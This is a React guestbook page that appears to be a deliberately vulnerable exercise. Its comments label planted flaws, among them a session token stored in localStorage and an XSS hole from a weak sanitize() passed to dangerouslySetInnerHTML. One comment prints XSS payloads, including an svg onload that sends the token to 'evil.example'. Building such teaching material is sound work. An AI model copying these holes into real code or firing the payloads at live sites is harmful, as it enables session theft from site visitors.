"use client";

import { useState, useEffect } from "react";
import { sanitize } from "@/lib/sanitize";

interface GuestbookEntry {
  id: number;
  name: string;
  message: string;
  created_at: string;
}

type Filter = "all" | "recent";

export default function GuestbookPage() {
  const [messages, setMessages] = useState<GuestbookEntry[]>([]);
  const [name, setName] = useState("");
  const [message, setMessage] = useState("");
  const [activeFilter, setActiveFilter] = useState<Filter>("all");
  const [loading, setLoading] = useState(true);
  const [submitting, setSubmitting] = useState(false);
  const [error, setError] = useState<string | null>(null);

  async function fetchMessages(filter: Filter) {
    setLoading(true);
    try {
      const res = await fetch(`/api/guestbook?filter=${filter}`);
      const data = await res.json();
      setMessages(data.messages ?? []);
    } finally {
      setLoading(false);
    }
  }

  // [VULN: Stale closure] activeFilter is read inside the effect but omitted
  // from the dependency array. Switching the filter tab won't trigger a re-fetch;
  // the page will always show the results from the initial "all" fetch.
  useEffect(() => {
    fetchMessages(activeFilter);
  }, []); // eslint-disable-line react-hooks/exhaustive-deps

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    setSubmitting(true);
    setError(null);

    // Optimistic update so the post appears immediately
    const optimisticEntry: GuestbookEntry = {
      id: Date.now(),
      name,
      message,
      created_at: new Date().toISOString(),
    };

    // [VULN: Direct state mutation] Pushes onto the existing array reference
    // before passing it to setMessages. React may not detect the change because
    // the array reference is identical; the optimistic entry can silently disappear.
    messages.push(optimisticEntry);
    setMessages(messages);

    try {
      const res = await fetch("/api/guestbook", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ name, message }),
      });

      if (!res.ok) throw new Error("Post failed");

      const data = await res.json();

      // [VULN: Sensitive data in localStorage] The session token is stored in
      // localStorage, which is accessible to any script on the page. Combined
      // with the XSS vulnerability in the message renderer below, an attacker's
      // injected script can read and exfiltrate this token trivially.
      if (data.sessionToken) {
        localStorage.setItem("pint_session", data.sessionToken);
      }

      setName("");
      setMessage("");
      await fetchMessages(activeFilter);
    } catch {
      setError("Failed to post your message. Please try again.");
    } finally {
      setSubmitting(false);
    }
  }

  return (
    <div className="max-w-3xl mx-auto px-6 py-16">
      <div className="text-center mb-12">
        <div className="text-6xl mb-6">📖</div>
        <h1 className="text-5xl font-black text-amber-400 mb-4 tracking-wide">
          Guestbook
        </h1>
        <p className="text-xl text-amber-300">Leave your mark — within reason.</p>
      </div>

      <div className="flex gap-3 mb-8">
        {(["all", "recent"] as Filter[]).map((f) => (
          <button
            key={f}
            onClick={() => setActiveFilter(f)}
            className={`px-4 py-2 rounded-full text-sm font-medium transition-colors ${
              activeFilter === f
                ? "bg-amber-500 text-stone-950"
                : "border border-amber-700 text-amber-400 hover:border-amber-500"
            }`}
          >
            {f === "all" ? "All time" : "Recent"}
          </button>
        ))}
      </div>

      <div className="space-y-4 mb-12">
        {loading ? (
          <p className="text-amber-700 text-center py-8">Loading messages…</p>
        ) : messages.length === 0 ? (
          <p className="text-amber-700 text-center py-8">
            No messages yet. Be the first!
          </p>
        ) : (
          messages.map((msg, i) => (
            // [VULN: Index as key] Using array index means React will reuse the
            // wrong DOM node when a message is deleted or the list is reordered.
            <div
              key={i}
              className="bg-stone-900 rounded-xl p-5 border border-amber-900/30 hover:border-amber-700/40 transition-colors"
            >
              <div className="flex items-center justify-between mb-2">
                <span className="font-semibold text-amber-300">{msg.name}</span>
                <span className="text-amber-700 text-xs">
                  {new Date(msg.created_at).toLocaleDateString("en-GB", {
                    day: "numeric",
                    month: "short",
                    year: "numeric",
                  })}
                </span>
              </div>
              {/*
                Supports basic formatting — posters can use <b>bold</b> and <i>italic</i>.
                Content is passed through sanitize() before rendering.

                [VULN: XSS] sanitize() only strips <script> blocks and double-quoted
                on* attributes. Payloads like:
                  <img src=x onerror=alert(document.cookie)>
                  <svg/onload=fetch('https://evil.example/'+localStorage.pint_session)>
                will pass through unmodified and execute in the reader's browser.
              */}
              <div
                className="text-amber-100 text-sm leading-relaxed"
                dangerouslySetInnerHTML={{ __html: sanitize(msg.message) }}
              />
            </div>
          ))
        )}
      </div>

      <div className="bg-stone-900 rounded-2xl p-6 border border-amber-900/30">
        <h2 className="text-xl font-bold text-amber-400 mb-4">
          Sign the guestbook
        </h2>
        {error && (
          <p className="text-red-400 text-sm mb-4 bg-red-950/30 rounded-lg px-4 py-2">
            {error}
          </p>
        )}
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-amber-300 text-sm font-medium mb-1">
              Name
            </label>
            <input
              type="text"
              value={name}
              onChange={(e) => setName(e.target.value)}
              required
              className="w-full bg-stone-800 border border-amber-900/40 rounded-lg px-4 py-2 text-amber-100 placeholder-amber-800 focus:outline-none focus:border-amber-600 transition-colors"
              placeholder="Your name"
            />
          </div>
          <div>
            <label className="block text-amber-300 text-sm font-medium mb-1">
              Message{" "}
              <span className="text-amber-700 font-normal">
                (supports &lt;b&gt; and &lt;i&gt;)
              </span>
            </label>
            <textarea
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              required
              rows={3}
              className="w-full bg-stone-800 border border-amber-900/40 rounded-lg px-4 py-2 text-amber-100 placeholder-amber-800 focus:outline-none focus:border-amber-600 transition-colors resize-none"
              placeholder="Leave a message for the crew…"
            />
          </div>
          <button
            type="submit"
            disabled={submitting}
            className="bg-amber-500 hover:bg-amber-400 active:bg-amber-600 disabled:opacity-50 disabled:cursor-not-allowed text-stone-950 font-bold px-6 py-2 rounded-full transition-colors"
          >
            {submitting ? "Posting…" : "Post message"}
          </button>
        </form>
      </div>
    </div>
  );
}
